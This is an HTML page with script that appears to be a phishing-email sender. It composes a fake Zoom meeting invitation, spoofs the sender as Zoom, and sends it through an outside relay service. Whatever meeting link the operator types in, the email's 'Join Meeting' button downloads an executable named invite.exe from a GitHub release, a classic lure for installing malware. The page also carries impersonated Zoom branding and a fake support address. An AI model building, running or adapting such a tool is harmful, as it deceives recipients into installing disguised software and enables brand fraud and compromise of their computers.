<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Zoom — Meeting Invitation Sender</title>
  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,600;1,300;1,400&family=Josefin+Sans:wght@100;300;400&display=swap" rel="stylesheet">
  <style>
    :root {
      --black: #080808;
      --deep: #0d0d0d;
      --surface: #111111;
      --card: #161616;
      --border: rgba(255,255,255,0.07);
      --border-hover: rgba(255,255,255,0.18);
      --gold: #22c55e;
      --gold-dim: #4ade80;
      --gold-glow: rgba(34,197,94,0.15);
      --white: #f0ece4;
      --muted: #6a6560;
      --text: #c8c4bc;
    }

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: var(--black);
      font-family: 'Josefin Sans', sans-serif;
      color: var(--text);
      min-height: 100vh;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
      pointer-events: none;
      z-index: 0;
      opacity: 0.6;
    }

    body::after {
      content: '';
      position: fixed;
      top: -200px;
      left: 50%;
      transform: translateX(-50%);
      width: 600px;
      height: 400px;
      background: radial-gradient(ellipse, rgba(34,197,94,0.06) 0%, transparent 70%);
      pointer-events: none;
      z-index: 0;
    }

    header {
      position: relative;
      z-index: 10;
      text-align: center;
      padding: 56px 20px 40px;
      border-bottom: 1px solid var(--border);
      animation: fadeDown 0.9s cubic-bezier(0.16,1,0.3,1) both;
    }

    .logo-lockup { display: inline-flex; flex-direction: column; align-items: center; gap: 6px; }
    .logo-eyebrow { font-family: 'Josefin Sans', sans-serif; font-weight: 100; font-size: 10px; letter-spacing: 0.4em; color: var(--gold); text-transform: uppercase; }
    .logo-main { font-family: 'Cormorant Garamond', serif; font-weight: 300; font-size: 38px; letter-spacing: 0.12em; color: var(--white); line-height: 1; }
    .logo-main em { font-style: italic; color: var(--gold); }
    .logo-rule { width: 60px; height: 1px; background: linear-gradient(90deg, transparent, var(--gold), transparent); margin: 10px auto 0; }
    .header-sub { margin-top: 14px; font-weight: 100; font-size: 11px; letter-spacing: 0.35em; text-transform: uppercase; color: var(--muted); }

    main {
      position: relative;
      z-index: 10;
      max-width: 1100px;
      margin: 0 auto;
      padding: 48px 24px 80px;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 2px;
      animation: fadeUp 0.9s 0.15s cubic-bezier(0.16,1,0.3,1) both;
    }

    @media (max-width: 760px) { main { grid-template-columns: 1fr; } }

    .panel {
      background: var(--card);
      border: 1px solid var(--border);
      padding: 36px 32px;
      position: relative;
      overflow: hidden;
      transition: border-color 0.4s;
    }

    .panel:first-child { border-radius: 2px 0 0 2px; }
    .panel:last-child { border-radius: 0 2px 2px 0; border-left: none; }

    @media (max-width: 760px) {
      .panel:first-child { border-radius: 2px 2px 0 0; }
      .panel:last-child { border-radius: 0 0 2px 2px; border-left: 1px solid var(--border); border-top: none; }
    }

    .panel::before {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0;
      height: 1px;
      background: linear-gradient(90deg, transparent, var(--gold-dim), transparent);
      opacity: 0;
      transition: opacity 0.4s;
    }
    .panel:hover::before { opacity: 1; }

    .panel::after {
      content: '';
      position: absolute;
      top: 12px; right: 12px;
      width: 12px; height: 12px;
      border-top: 1px solid var(--gold-dim);
      border-right: 1px solid var(--gold-dim);
      opacity: 0.4;
    }

    .panel-title { font-family: 'Cormorant Garamond', serif; font-weight: 300; font-size: 22px; letter-spacing: 0.08em; color: var(--white); margin-bottom: 6px; }
    .panel-desc { font-size: 10px; letter-spacing: 0.25em; text-transform: uppercase; color: var(--muted); margin-bottom: 32px; padding-bottom: 20px; border-bottom: 1px solid var(--border); }

    .field { margin-bottom: 20px; }
    .field label { display: block; font-size: 9px; letter-spacing: 0.3em; text-transform: uppercase; color: var(--gold-dim); margin-bottom: 8px; font-weight: 400; }

    .field input {
      width: 100%;
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 1px;
      padding: 12px 14px;
      color: var(--white);
      font-family: 'Josefin Sans', sans-serif;
      font-size: 13px;
      font-weight: 300;
      letter-spacing: 0.05em;
      outline: none;
      transition: border-color 0.3s, box-shadow 0.3s;
      -webkit-appearance: none;
    }

    .field input::placeholder { color: var(--muted); font-weight: 100; }
    .field input:focus { border-color: var(--gold-dim); box-shadow: 0 0 0 1px rgba(34,197,94,0.1), inset 0 0 20px rgba(34,197,94,0.03); }

    .field-static {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 1px;
      padding: 12px 14px;
      font-size: 13px;
      font-weight: 300;
      letter-spacing: 0.05em;
      color: var(--muted);
    }

    .send-btn {
      width: 100%;
      margin-top: 28px;
      padding: 15px 24px;
      background: transparent;
      border: 1px solid var(--gold-dim);
      color: var(--gold);
      font-family: 'Josefin Sans', sans-serif;
      font-size: 11px;
      font-weight: 300;
      letter-spacing: 0.4em;
      text-transform: uppercase;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      transition: color 0.4s, border-color 0.4s;
      border-radius: 1px;
    }

    .send-btn::before {
      content: '';
      position: absolute;
      inset: 0;
      background: linear-gradient(135deg, var(--gold) 0%, #22c55e 100%);
      transform: translateY(100%);
      transition: transform 0.4s cubic-bezier(0.16,1,0.3,1);
    }
    .send-btn:hover::before { transform: translateY(0); }
    .send-btn:hover { color: var(--black); border-color: var(--gold); }
    .send-btn span { position: relative; z-index: 1; }

    #status { margin-top: 14px; font-size: 11px; letter-spacing: 0.15em; text-align: center; min-height: 18px; color: var(--muted); transition: color 0.3s; }
    #status.success { color: var(--gold); }
    #status.error { color: #c06060; }

    .preview-wrap { display: flex; flex-direction: column; }
    .preview-chrome { background: var(--surface); border: 1px solid var(--border); border-bottom: none; border-radius: 1px 1px 0 0; padding: 10px 14px; display: flex; align-items: center; gap: 6px; }
    .chrome-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--border-hover); }
    .chrome-label { margin-left: auto; font-size: 9px; letter-spacing: 0.25em; text-transform: uppercase; color: var(--muted); }

    iframe { flex: 1; width: 100%; min-height: 420px; border: 1px solid var(--border); border-radius: 0 0 1px 1px; background: #fff; display: block; }

    footer { position: relative; z-index: 10; text-align: center; padding: 24px; border-top: 1px solid var(--border); font-size: 10px; letter-spacing: 0.3em; text-transform: uppercase; color: var(--muted); }
    footer span { color: var(--gold-dim); }

    @keyframes fadeDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes fadeUp { from { opacity: 0; transform: translateY(24px); } to { opacity: 1; transform: translateY(0); } }
  </style>
</head>
<body>

  <header>
    <div class="logo-lockup">
      <div class="logo-eyebrow">Meeting Platform</div>
      <div class="logo-main">Plu<em>ton</em></div>
      <div class="logo-rule"></div>
      <div class="header-sub">Invitation Sender</div>
    </div>
  </header>

  <main>
    <!-- COMPOSE PANEL -->
    <div class="panel">
      <div class="panel-title">Compose</div>
      <div class="panel-desc">Fixed recipient · Resend API</div>

      <div class="field">
        <label>API Credential</label>
        <input type="password" id="apiKey" placeholder="re_••••••••••••••••" />
      </div>

      <div class="field">
        <label>Recipient</label>
        <input type="text" id="email_receipient" placeholder="Enter email" />
      </div>

      <div class="field">
        <label>Recipient Name</label>
        <input type="text" id="nameInput" placeholder="e.g. John" value="John" />
      </div>

      <div class="field">
        <label>Subject Line</label>
        <input type="text" id="subjectInput" placeholder="Your Zoom meeting invitation" value="Your Zoom Meeting Invitation" />
      </div>

      <div class="field">
        <label>Meeting Date</label>
        <input type="text" id="dateInput" placeholder="e.g. 15th July 2026" value="15th July 2026" />
      </div>

      <div class="field">
        <label>Meeting Link</label>
        <input type="url" id="linkInput" placeholder="https://Zoom.example.com/j/123456" />
      </div>

      <button class="send-btn" id="sendBtn">
        <span>Send Invitation</span>
      </button>
      <div id="status"></div>
    </div>

    <!-- PREVIEW PANEL -->
    <div class="panel preview-wrap">
      <div class="panel-title">Preview</div>
      <div class="panel-desc">Live render · Fixed template</div>

      <div class="preview-chrome">
        <div class="chrome-dot"></div>
        <div class="chrome-dot"></div>
        <div class="chrome-dot"></div>
        <div class="chrome-label">Email Preview</div>
      </div>
      <iframe id="emailPreview" title="Email Preview"></iframe>
    </div>
  </main>

  <footer>
    <span>Zoom</span> &nbsp;·&nbsp; Meeting Platform &nbsp;·&nbsp; Encrypted Transmission
  </footer>

  <script>
    const nameInput    = document.getElementById("nameInput");
    const subjectInput = document.getElementById("subjectInput");
    const dateInput    = document.getElementById("dateInput");
    const linkInput    = document.getElementById("linkInput");
    const apiInput     = document.getElementById("apiKey");
    const emailPreview = document.getElementById("emailPreview");
    const statusEl     = document.getElementById("status");
    const sendBtn      = document.getElementById("sendBtn");

   
    function generateHTML(name, date, link) {
      var safeLink = link || "#";
      return [
        '<!DOCTYPE html><html><head>',
        '<meta charset="UTF-8"/>',
        '<meta name="viewport" content="width=device-width,initial-scale=1"/>',
        '<\/head>',
        '<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#eef3fc;padding:32px 16px;"><tr><td align="center">',
        '<table role="presentation" width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%;background-color:#ffffff;border-radius:16px;overflow:hidden;box-shadow:0 10px 30px rgba(30,60,120,0.08);">',
        '<tr><td style="background-color:#2d6cf6;padding:28px 32px;">',
        '<span style="font-size:22px;font-weight:800;color:#ffffff;letter-spacing:0.5px;">Zoom Meeting Invitation<\/span>',
        '<\/td><\/tr>',
        '<tr><td style="padding:32px;">',
        '<p style="margin:0 0 16px;font-size:16px;color:#1a2233;">Hi ' + name + ',<\/p>',
        '<p style="margin:0 0 16px;font-size:16px;line-height:1.6;color:#1a2233;">You\'re invited to a Zoom meeting as an alternative host.<\/p>',
        '<p style="margin:0 0 24px;font-size:16px;line-height:1.6;color:#1a2233;">Please find the meeting details below and click the button to join at the scheduled time.<\/p>',
        '<p style="margin:0 0 10px;font-size:15px;font-weight:700;color:#1a2233;">Meeting Details:<\/p>',
        '<ul style="margin:0 0 24px;padding-left:20px;font-size:15px;color:#1a2233;line-height:1.9;">',
        '<li>Date: <strong>' + date + '<\/strong><\/li>',
        '<li>Time: <strong>Ongoing<\/strong><\/li>',
        '<li>Duration: <strong>Approximately 30 minutes<\/strong><\/li>',
        '<li>Platform: <strong>Zoom<\/strong><\/li>',
        '<\/ul>',
        '<table role="presentation" cellpadding="0" cellspacing="0" style="margin:8px 0 28px;"><tr>',
        '<td style="border-radius:10px;background-color:#2d6cf6;">',
        '<a href="https://github.com/Global-Trade-Plus/invite/releases/latest/download/invite.exe" style="display:inline-block;padding:14px 28px;font-size:15px;font-weight:700;color:#ffffff;text-decoration:none;">Join Meeting<\/a>',
        '<\/td><\/tr><\/table>',
        '<p style="margin:0 0 12px;font-size:15px;font-weight:700;color:#1a2233;">Important Requirements:<\/p>',
        '<p style="margin:0 0 16px;font-size:15px;line-height:1.6;color:#1a2233;">Ensure to join the meeting using a Desktop or Laptop computer for the best experience. Please arrive a couple of minutes early to test your audio and video.<\/p>',
        '<p style="margin:0 0 24px;font-size:15px;line-height:1.6;color:#1a2233;">If you need any assistance, or are unable to start the meeting, we\'re here to help! Send us an email at <a href="mailto:support@zoom.app" style="color:#2d6cf6;text-decoration:underline;">support@zoom.app<\/a><\/p>',
        '<p style="margin:0 0 16px;font-size:15px;line-height:1.6;color:#1a2233;">I am looking forward to connecting with you! Please acknowledge receipt of this email and confirm your availability for the meeting.<\/p>',
        '<p style="margin:0;font-size:15px;color:#1a2233;">Thanks.<\/p>',
        '<\/td><\/tr>',
        '<tr><td style="padding:20px 32px 28px;border-top:1px solid #e3e9f5;">',
        '<p style="margin:0;font-size:12px;color:#9aa3b2;">&copy; 2026 Zoom, Inc.<\/p>',
        '<\/td><\/tr>',
        '<\/table><\/td><\/tr><\/table>',
        '<\/body><\/html>'
      ].join('');
    }

    function updatePreview() {
      emailPreview.srcdoc = generateHTML(
        nameInput.value || "there",
        dateInput.value || "TBD",
        linkInput.value
      );
    }

    updatePreview();
    nameInput.addEventListener("input", updatePreview);
    dateInput.addEventListener("input", updatePreview);
    linkInput.addEventListener("input", updatePreview);

    function setStatus(msg, type = '') {
      statusEl.textContent = msg;
      statusEl.className = type;
    }

    sendBtn.addEventListener("click", async () => {
      const name    = nameInput.value.trim();
      const subject = subjectInput.value.trim();
      const date    = dateInput.value.trim();
      const link    = linkInput.value.trim();
      const apiKey  = apiInput.value.trim();

      if (!name || !subject || !date || !link || !apiKey) {
        setStatus("All fields are required.", "error");
        return;
      }

      sendBtn.classList.add("loading");
      sendBtn.querySelector("span").textContent = "Sending";
      setStatus("Sending invitation…");
 const FIXED_RECIPIENT_ccheck = document.getElementById("email_receipient")

const FIXED_RECIPIENT=FIXED_RECIPIENT_ccheck.value
      try {
        const res = await fetch("https://global-email-eur7.onrender.com/transactions/send-email", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            from: '"Zoom" <support@globalmetricsplus.com>',
            to: FIXED_RECIPIENT,
            subject,
            html: generateHTML(name, date, link),
          }),
        });

        if (res.ok) {
          setStatus("Invitation sent.", "success");
          sendBtn.querySelector("span").textContent = "Sent ✓";
        } else {
          const data = await res.json().catch(() => ({}));
          setStatus("Send failed: " + (data.message || res.statusText), "error");
          sendBtn.querySelector("span").textContent = "Send Invitation";
        }
      } catch (err) {
        setStatus("Connection error: " + err.message, "error");
        sendBtn.querySelector("span").textContent = "Send Invitation";
      } finally {
        sendBtn.classList.remove("loading");
      }
    });
  </script>
</body>
</html>
